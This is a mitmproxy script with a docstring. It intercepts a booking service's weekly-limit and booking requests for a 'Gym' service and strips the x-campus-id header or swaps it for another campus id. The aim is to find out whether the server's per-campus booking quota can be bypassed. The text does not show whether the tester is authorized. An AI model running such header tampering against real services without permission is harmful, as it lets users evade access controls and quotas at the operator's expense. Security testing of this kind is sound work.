"""
Tests whether the weekly limit is actually scoped per-campus via the
x-campus-id header, or whether the server derives campus from the
auth token / user record server-side regardless of the header.

Targets Gym (exhausted under your real campus id), on both the
weekly-limit GET and the booking POST.

MODE "strip": removes x-campus-id entirely.
MODE "swap": replaces it with ALT_CAMPUS_ID.

Expected/safe outcome: no change in behavior either way (still
exhausted, or request rejected/ignored the header) — because the
server should resolve campus from the authenticated session, not a
client-supplied header. If stripping or swapping the header lets a
booking through, or shows a different (non-exhausted) weekly-limit
for Gym, that's a real finding.

Run with:
    mitmdump -s campus_header_tamper_test.py
"""

import json
from mitmproxy import http, ctx

TARGET_SERVICE_ID = "cmkztqx2d000fuckto9dknnv3"  # Gym
MODE = "strip"  # "strip" or "swap"
ALT_CAMPUS_ID = (
	"99"  # used only when MODE == "swap"; pick an id that isn't yours
)


def matches(flow: http.HTTPFlow) -> bool:
	req = flow.request
	p = req.path.split("?")[0]
	if (
		p.endswith("/bookings/services/weekly-limit")
		and req.method == "GET"
	):
		return req.query.get("service_id") == TARGET_SERVICE_ID
	if p.endswith("/bookings/services") and req.method == "POST":
		try:
			body = json.loads(req.get_text() or "{}")
		except ValueError:
			return False
		return body.get("service_id") == TARGET_SERVICE_ID
	return False


def request(flow: http.HTTPFlow) -> None:
	if not matches(flow):
		return
	before = flow.request.headers.get("x-campus-id")
	if MODE == "strip":
		flow.request.headers.pop("x-campus-id", None)
		flow.comment = "tampered: stripped x-campus-id"
	elif MODE == "swap":
		flow.request.headers["x-campus-id"] = ALT_CAMPUS_ID
		flow.comment = f"tampered: x-campus-id -> {ALT_CAMPUS_ID}"
	ctx.log.info(
		f"[campus-header] {MODE}: x-campus-id {before!r} -> {flow.request.headers.get('x-campus-id')!r}"
	)


def response(flow: http.HTTPFlow) -> None:
	if not matches(flow) or flow.response is None:
		return
	ctx.log.info(
		f"[campus-header] response status={flow.response.status_code} "
		f"body={flow.response.get_text()}"
	)
